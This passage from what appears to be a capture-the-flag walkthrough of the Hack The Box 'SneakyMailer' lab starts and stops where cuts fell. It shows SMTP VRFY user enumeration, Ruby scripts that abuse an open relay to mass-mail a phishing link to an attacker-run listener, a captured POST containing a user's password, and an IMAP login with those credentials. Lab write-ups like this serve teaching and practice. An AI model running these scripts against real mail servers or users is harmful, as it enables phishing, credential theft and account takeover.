page anyway.</p><h2 id=service-discovery>Service discovery<a hidden class=anchor aria-hidden=true href=#service-discovery>#</a></h2><p>The FTP is not accessible anonymously and we don&rsquo;t have credentials yet.</p><p>There are a SMTP and IMAP server. This also another web server on port 8080
but found nothing while enumerating.</p><h2 id=smtp--imap-exploitation>SMTP & IMAP exploitation<a hidden class=anchor aria-hidden=true href=#smtp--imap-exploitation>#</a></h2><p>Let&rsquo;s connect to the SMTP server and try to verify some email addresses:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ncat sneakycorp.htb 25
</span></span><span class=line><span class=cl>220 debian ESMTP Postfix (Debian/GNU)
</span></span><span class=line><span class=cl>vrfy cyfun@sneakymailer.htb
</span></span><span class=line><span class=cl>550 5.1.1 &lt;cyfun@sneakymailer.htb&gt;: Recipient address rejected: User unknown in virtual mailbox table
</span></span><span class=line><span class=cl>vrfy airisatou@sneakymailer.htb
</span></span><span class=line><span class=cl>252 2.0.0 airisatou@sneakymailer.htb
</span></span></code></pre></td></tr></table></div></div><p>So it means our account was not created after filling the registration form
but emails listed on the team page seem valid.</p><p>I wrote a short ruby script to scrap & parse the website to extract the email
addresses:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#! /usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;nokogiri&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;open-uri&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>doc</span> <span class=o>=</span> <span class=no>Nokogiri</span><span class=o>::</span><span class=no>HTML</span><span class=p>(</span><span class=no>URI</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;http://sneakycorp.htb/team.php&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>cells</span> <span class=o>=</span> <span class=n>doc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;table#dataTable tbody tr td&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cells</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>c</span><span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=nb>puts</span> <span class=n>c</span><span class=o>.</span><span class=n>text</span> <span class=k>if</span> <span class=sr>/@sneakymailer.htb/</span><span class=o>.</span><span class=n>match?</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby grab_email.rb &gt; emails.txt
</span></span></code></pre></td></tr></table></div></div><p>If we want to verify all email addresses, we can re-use a
<a href=https://rubyfu.net/module-0x3-or-network-kung-fu/email/smtp-enumeration>Rubyfu - SMTP Enumeration</a>
script and modify it a bit.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;socket&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>users</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;emails.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>found</span> <span class=o>=</span> <span class=o>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=vi>@s</span> <span class=o>=</span> <span class=no>TCPSocket</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;sneakycorp.htb&#39;</span><span class=p>,</span> <span class=mi>25</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=vi>@banner</span> <span class=o>=</span> <span class=vi>@s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>chomp</span>
</span></span><span class=line><span class=cl><span class=n>users</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>user</span><span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;VRFY </span><span class=si>#{</span><span class=n>user</span><span class=si>}</span><span class=s2> </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=n>resp</span> <span class=o>=</span> <span class=vi>@s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>chomp</span>
</span></span><span class=line><span class=cl>  <span class=n>found</span> <span class=o>&lt;&lt;</span> <span class=n>user</span> <span class=k>if</span> <span class=n>resp</span><span class=o>.</span><span class=n>split</span><span class=o>[</span><span class=mi>2</span><span class=o>]</span> <span class=o>==</span> <span class=n>user</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl><span class=vi>@s</span><span class=o>.</span><span class=n>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[*] Result:-&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[+] Banner: &#34;</span> <span class=o>+</span> <span class=vi>@banner</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[+] Found users: </span><span class=se>\n</span><span class=si>#{</span><span class=n>found</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>In theory there is <a href=https://nmap.org/>nmap</a> script for that too but it didn&rsquo;t work in my case:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>nmap</span> <span class=o>--</span><span class=n>script</span> <span class=n>smtp</span><span class=o>-</span><span class=k>enum</span><span class=o>-</span><span class=n>users</span><span class=o>.</span><span class=n>nse</span> <span class=o>--</span><span class=n>script</span><span class=o>-</span><span class=n>args</span> <span class=n>smtp</span><span class=o>-</span><span class=k>enum</span><span class=o>-</span><span class=n>users</span><span class=o>.</span><span class=n>methods</span><span class=o>=</span><span class=p>{</span><span class=n>VRFY</span><span class=p>},</span><span class=n>userdb</span><span class=o>=$</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span><span class=o>/</span><span class=n>emails</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>p</span> <span class=mi>25</span> <span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span>
</span></span></code></pre></td></tr></table></div></div><p>We can use another script to very available commands:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ nmap --script smtp-commands.nse -pT:25 sneakycorp.htb
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:03 CET
</span></span><span class=line><span class=cl>Nmap scan report for sneakycorp.htb (10.10.10.197)
</span></span><span class=line><span class=cl>Host is up (0.022s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>25/tcp open  smtp
</span></span><span class=line><span class=cl>|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 10.36 seconds
</span></span></code></pre></td></tr></table></div></div><p>There is another script to check for open relay but it doesn&rsquo;t work here
(maybe because the anti-spam test target nmap.scanme.org by default).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ nmap --script smtp-open-relay.nse  -p 25 sneakycorp.htb --script-args smtp-open-relay.to=tigernixon@sneakymailer.htb,smtp-open-relay.from=cyfun@sneakymailer.htb
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-08 19:09 CET
</span></span><span class=line><span class=cl>Nmap scan report for sneakycorp.htb (10.10.10.197)
</span></span><span class=line><span class=cl>Host is up (0.023s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE
</span></span><span class=line><span class=cl>25/tcp open  smtp
</span></span><span class=line><span class=cl>|_smtp-open-relay: Server doesn&#39;t seem to be an open relay, all tests failed
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds
</span></span></code></pre></td></tr></table></div></div><p>Before going farther I checked we can&rsquo;t read emails from the account we
registered. The <a href=https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax>HackTricks - IMAP Syntax</a>
was useful for that.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ncat sneakycorp.htb 143
</span></span><span class=line><span class=cl>* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
</span></span><span class=line><span class=cl>A1 LOGIN &#34;cyfun@sneakymailer.htb&#34; &#34;password&#34;
</span></span><span class=line><span class=cl>A1 NO Login failed.
</span></span></code></pre></td></tr></table></div></div><p>I seems the SMTP server is vulnerable to open relay:</p><blockquote><p>An SMTP server that works as an open relay, is a email server that does not verify if the user is authorised to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ncat sneakycorp.htb 25
</span></span><span class=line><span class=cl>MA220 debian ESMTP Postfix (Debian/GNU)
</span></span><span class=line><span class=cl>MAIL from:cyfun@sneakymailer.htb
</span></span><span class=line><span class=cl>250 2.1.0 Ok
</span></span><span class=line><span class=cl>RCPT to:tigernixon@sneakymailer.htb
</span></span><span class=line><span class=cl>250 2.1.5 Ok
</span></span><span class=line><span class=cl>DATA
</span></span><span class=line><span class=cl>354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
</span></span><span class=line><span class=cl>hello open relay
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>250 2.0.0 Ok: queued as 4773E25011
</span></span></code></pre></td></tr></table></div></div><p>I wrote a script to abuse of SMTP open relay and send a test email to all users:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;socket&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>users</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;emails.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=vi>@s</span> <span class=o>=</span> <span class=no>TCPSocket</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;sneakycorp.htb&#39;</span><span class=p>,</span> <span class=mi>25</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=vi>@banner</span> <span class=o>=</span> <span class=vi>@s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>chomp</span>
</span></span><span class=line><span class=cl><span class=n>users</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>user</span><span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;MAIL from:cyfun@sneakymailer.htb </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;RCPT to:</span><span class=si>#{</span><span class=n>user</span><span class=si>}</span><span class=s2> </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;DATA </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;test </span><span class=se>\r\n</span><span class=s2>.</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=n>resp</span> <span class=o>=</span> <span class=vi>@s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>chomp</span>
</span></span><span class=line><span class=cl>  <span class=nb>puts</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl><span class=vi>@s</span><span class=o>.</span><span class=n>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[*] Result:-&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[+] Banner: &#34;</span> <span class=o>+</span> <span class=vi>@banner</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s change the email body content, replacing test by phishing content
like a link to our web server and hope one of the users will click it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;socket&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>users</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;emails.txt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=vi>@s</span> <span class=o>=</span> <span class=no>TCPSocket</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s1>&#39;sneakycorp.htb&#39;</span><span class=p>,</span> <span class=mi>25</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=vi>@banner</span> <span class=o>=</span> <span class=vi>@s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>chomp</span>
</span></span><span class=line><span class=cl><span class=n>users</span><span class=o>.</span><span class=n>each</span> <span class=k>do</span> <span class=o>|</span><span class=n>user</span><span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;MAIL from:cyfun@sneakymailer.htb </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;RCPT to:</span><span class=si>#{</span><span class=n>user</span><span class=si>}</span><span class=s2> </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;DATA </span><span class=se>\n\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=vi>@s</span><span class=o>.</span><span class=n>send</span> <span class=s2>&#34;http://10.10.14.142:8080 </span><span class=se>\r\n</span><span class=s2>.</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  <span class=n>resp</span> <span class=o>=</span> <span class=vi>@s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>chomp</span>
</span></span><span class=line><span class=cl>  <span class=nb>puts</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl><span class=vi>@s</span><span class=o>.</span><span class=n>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[*] Result:-&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34;[+] Banner: &#34;</span> <span class=o>+</span> <span class=vi>@banner</span>
</span></span></code></pre></td></tr></table></div></div><p>Nice Paul felt into the trick:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 8080 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::8080 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:8080 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.197:52994 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>POST / HTTP/1.1
</span></span><span class=line><span class=cl>Host: 10.10.14.142:8080
</span></span><span class=line><span class=cl>User-Agent: python-requests/2.23.0
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept: */*
</span></span><span class=line><span class=cl>Connection: keep-alive
</span></span><span class=line><span class=cl>Content-Length: 185
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s URL decode the POST body:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>$</span> <span class=n>irb</span>
</span></span><span class=line><span class=cl><span class=n>irb</span><span class=p>(</span><span class=n>main</span><span class=p>):</span><span class=mo>001</span><span class=p>:</span><span class=mi>0</span><span class=o>&gt;</span> <span class=nb>require</span> <span class=s1>&#39;cgi&#39;</span>
</span></span><span class=line><span class=cl><span class=o>=&gt;</span> <span class=kp>true</span>
</span></span><span class=line><span class=cl><span class=n>irb</span><span class=p>(</span><span class=n>main</span><span class=p>):</span><span class=mo>002</span><span class=p>:</span><span class=mi>0</span><span class=o>&gt;</span> <span class=nb>puts</span> <span class=no>CGI</span><span class=o>.</span><span class=n>unescape</span><span class=p>(</span><span class=s1>&#39;firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J
</span></span></span><span class=line><span class=cl><span class=s1>%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>firstName</span><span class=o>=</span><span class=no>Paul</span><span class=o>&amp;</span><span class=n>lastName</span><span class=o>=</span><span class=no>Byrd</span><span class=o>&amp;</span><span class=n>email</span><span class=o>=</span><span class=n>paulbyrd</span><span class=vi>@sneakymailer</span><span class=o>.</span><span class=n>htb</span><span class=o>&amp;</span><span class=n>password</span><span class=o>=^</span><span class=p>(</span><span class=c1>#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span>
</span></span><span class=line><span class=cl><span class=o>=&gt;</span> <span class=n>ni</span>
</span></span></code></pre></td></tr></table></div></div><p>So here are our creds: <code>paulbyrd@sneakymailer.htb</code> / <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>.</p><p>It seems that the username is not the full email address:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ncat sneakycorp.htb 143
</span></span><span class=line><span class=cl>* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
</span></span><span class=line><span class=cl>A1 LOGIN &#34;paulbyrd@sneakymailer.htb&#34; &#34;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&#34;
</span></span><span class=line><span class=cl>A1 NO Login failed.
</span></span><span class=line><span class=cl>^C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ncat sneakycorp.htb 143
</span></span><span class=line><span class=cl>* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
</span></span><span class=line><span class=cl>A1 LOGIN &#34;paulbyrd&#34; &#34;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&#34;
</span></span><span class=line><span class=cl>* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
</span></span><span class=line><span class=cl>A1 OK LOGIN Ok.
</span></span><span class=line><span class=cl>A1 LIST &#34;&#34; *
</span></span><span class=line><span class=cl>* LIST (\Unmarked \HasChildren) &#34;.&#34; &#34;INBOX&#34;
</span></span><span class=line><span class=cl>* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Trash&#34;
</span></span><span class=line><span class=cl>* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Sent&#34;
</span></span><span class=line><span class=cl>* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Deleted Items&#34;
</span></span><span class=line><span class=cl>* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Queue&#34;
</span></span><span class=line><span class=cl>* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Sent Items&#34;
</span></span><span class=line><span class=cl>* LIST (\HasNoChildren) &#34;.&#34; &#34;INBOX.Drafts&#34;
</span></span><span class=line><span class=cl>A1 OK LIST completed
</span></span></code></pre></td></tr></table></div></div><p>I tried to connect to the IMAP server with Thunderbird and Kube but it
wasn&rsquo;t working but when I tried with Evolution it worked.</p><p>But it&rsquo;s possible to continue via raw IMAP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
